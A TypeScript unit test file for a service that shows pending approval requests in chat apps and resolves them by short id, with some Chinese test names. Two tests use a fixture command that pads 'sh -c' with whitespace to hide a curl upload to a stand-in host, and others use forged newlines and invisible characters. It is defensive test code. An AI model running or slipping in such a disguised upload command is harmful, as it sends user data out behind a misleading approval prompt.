/**
 * IMA-M2 — `ImApprovalService` unit coverage: the `/inbox` projection and the
 * short-id resolve path with every IM-specific gate. The REAL authority
 * (ownership / race / two-step resume) lives in `HostInboxService.resolve`
 * and is covered by inbox-service tests; here it is a recording fake, so we
 * can also pin exactly WHAT crosses the seam (decision shape + via tag).
 */

import { describe, expect, it } from 'vitest'

import type { InboxItem } from '@gotong/inbox'

import {
  IM_SHORT_ID_LEN,
  ImApprovalError,
  ImApprovalService,
} from '../src/im-approval-service.js'

function item(over: Partial<InboxItem> & { itemId: string }): InboxItem {
  return {
    userId: 'alice',
    kind: 'approval',
    prompt: '管家想执行一个敏感动作',
    parentKind: 'none',
    status: 'pending',
    createdAt: 100,
    ...over,
  } as InboxItem
}

function service(items: InboxItem[]) {
  const resolved: Array<{ itemId: string; userId: string; decision: unknown; via?: string }> = []
  const svc = new ImApprovalService({
    store: { listPending: async (userId) => items.filter((i) => i.userId === userId) },
    inbox: {
      resolve: async (args) => {
        resolved.push(args)
      },
    },
  })
  return { svc, resolved }
}

describe('ImApprovalService.listForIm', () => {
  it('projects rows newest-first with 8-char short ids', async () => {
    const { svc } = service([
      item({ itemId: 'aaaaaaaa-1111', createdAt: 100, imApprovable: true, title: '旧的' }),
      item({ itemId: 'bbbbbbbb-2222', createdAt: 200, imApprovable: true, title: '新的' }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows.map((r) => r.shortId)).toEqual(['bbbbbbbb', 'aaaaaaaa'])
    expect(rows[0]!.shortId).toHaveLength(IM_SHORT_ID_LEN)
    expect(rows[0]!.title).toBe('新的')
  })

  it('falls back to the prompt when there is no title', async () => {
    const { svc } = service([
      item({ itemId: 'cccccccc-3333', prompt: '删除助手 mailer', imApprovable: true }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title).toBe('删除助手 mailer')
    expect(rows[0]!.imApprovable).toBe(true)
  })

  it('renders imApprovable=false for unflagged items AND for non-approval kinds', async () => {
    const { svc } = service([
      item({ itemId: 'dddddddd-4444' }), // no flag — web only
      item({ itemId: 'eeeeeeee-5555', kind: 'choice', imApprovable: true } as never),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows.every((r) => r.imApprovable === false)).toBe(true)
  })

  it('一行放不下 ⇒ 列表照列,但**不能在 IM 批**,且截断处响亮(五轮 H1)', async () => {
    // 盲签的形状:一堆空白把真正的命令顶到 80 字之外。
    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
    const { svc } = service([item({ itemId: 'ffffffff-6666', title: evil, imApprovable: true })])
    const rows = await svc.listForIm('alice')
    expect(rows).toHaveLength(1) // 还是要知道有东西等着
    expect(rows[0]!.imApprovable).toBe(false)
    expect(rows[0]!.title).toContain('已截断')
    expect(rows[0]!.title).toContain(String(evil.length))
  })

  it('换行 / 不可见字符在**这一层**洗掉(第五个写入方 human 步同样受保护,五轮 H2)', async () => {
    const NL = String.fromCharCode(10)
    const ZWSP = String.fromCharCode(0x200b)
    const forged = `批准发布${NL}  • [deadbeef] 无害的小事${ZWSP}`
    const { svc } = service([item({ itemId: 'aaaa1111', title: forged, imApprovable: true })])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title).not.toContain(NL) // 伪造第二条列表行
    expect(rows[0]!.title).not.toContain(ZWSP)
    expect(rows[0]!.imApprovable).toBe(true) // 洗完仍在一行内 ⇒ 照常可批
  })
})

describe('ImApprovalService.resolveByShortId', () => {
  it('resolves a prefix match with the approval decision + via tag', async () => {
    const { svc, resolved } = service([
      item({ itemId: 'abcd1234-xyz', imApprovable: true, title: '删除 mailer' }),
    ])
    const out = await svc.resolveByShortId({
      userId: 'alice',
      shortId: 'abcd',
      approved: true,
      via: 'im:telegram',
    })
    expect(out.title).toBe('删除 mailer')
    expect(resolved).toEqual([
      {
        itemId: 'abcd1234-xyz',
        userId: 'alice',
        decision: { kind: 'approval', approved: true },
        via: 'im:telegram',
      },
    ])
  })

  it('passes approved:false through for a deny', async () => {
    const { svc, resolved } = service([item({ itemId: 'abcd1234', imApprovable: true })])
    await svc.resolveByShortId({ userId: 'alice', shortId: 'abcd1234', approved: false, via: 'im:lark' })
    expect(resolved[0]!.decision).toEqual({ kind: 'approval', approved: false })
  })

  it('rejects a too-short prefix (< 4 chars)', async () => {
    const { svc } = service([item({ itemId: 'abcd1234', imApprovable: true })])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'ab', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'short_id_too_short' })
  })

  it('rejects an unknown prefix as not_found', async () => {
    const { svc } = service([item({ itemId: 'abcd1234', imApprovable: true })])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'zzzz', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_found' })
  })

  it('matches within the caller own pending list only', async () => {
    // Bob owns the only item matching the prefix — Alice must see not_found,
    // structurally (her list simply does not contain it).
    const { svc, resolved } = service([item({ itemId: 'abcd1234', userId: 'bob', imApprovable: true })])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_found' })
    expect(resolved).toHaveLength(0)
  })

  it('rejects an ambiguous prefix, listing the full short codes', async () => {
    const { svc } = service([
      item({ itemId: 'abcd1111-x', imApprovable: true }),
      item({ itemId: 'abcd2222-y', imApprovable: true }),
    ])
    const err = await svc
      .resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' })
      .then(
        () => null,
        (e: unknown) => e,
      )
    expect(err).toBeInstanceOf(ImApprovalError)
    expect((err as ImApprovalError).code).toBe('ambiguous')
    expect((err as ImApprovalError).message).toContain('abcd1111')
    expect((err as ImApprovalError).message).toContain('abcd2222')
  })

  it('re-checks the write-time whitelist server-side (web_only, fail-closed)', async () => {
    const { svc, resolved } = service([item({ itemId: 'abcd1234' })]) // flag unset
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'web_only' })
    expect(resolved).toHaveLength(0)
  })

  it('rejects a non-approval kind even when flagged (needs a typed answer)', async () => {
    const { svc } = service([
      item({ itemId: 'abcd1234', kind: 'choice', imApprovable: true } as never),
    ])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_approval_kind' })
  })

  it('看不全就拒批:短码是从旧列表抄来的也一样(五轮 H1)', async () => {
    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
    const { svc, resolved } = service([
      item({ itemId: 'abcd1234', title: evil, imApprovable: true }),
    ])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'title_truncated' })
    expect(resolved).toHaveLength(0)
  })

  it('批准回执里的标题是洗过的那份,不是原文(桥拿去回话)', async () => {
    const RLO = String.fromCharCode(0x202e)
    const { svc, resolved } = service([
      item({ itemId: 'abcd1234', title: `删除助手 mailer${RLO}`, imApprovable: true }),
    ])
    const out = await svc.resolveByShortId({
      userId: 'alice',
      shortId: 'abcd',
      approved: true,
      via: 'im:t',
    })
    expect(resolved).toHaveLength(1)
    expect(out.title).not.toContain(RLO)
    expect(out.title).toContain('删除助手 mailer')
  })

  it('lets resolve-side errors pass through untouched (one error vocabulary)', async () => {
    const boom = Object.assign(new Error('already resolved'), { code: 'already_resolved' })
    const svc = new ImApprovalService({
      store: { listPending: async () => [item({ itemId: 'abcd1234', imApprovable: true })] },
      inbox: {
        resolve: async () => {
          throw boom
        },
      },
    })
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'abcd', approved: true, via: 'im:t' }),
    ).rejects.toBe(boom)
  })
})
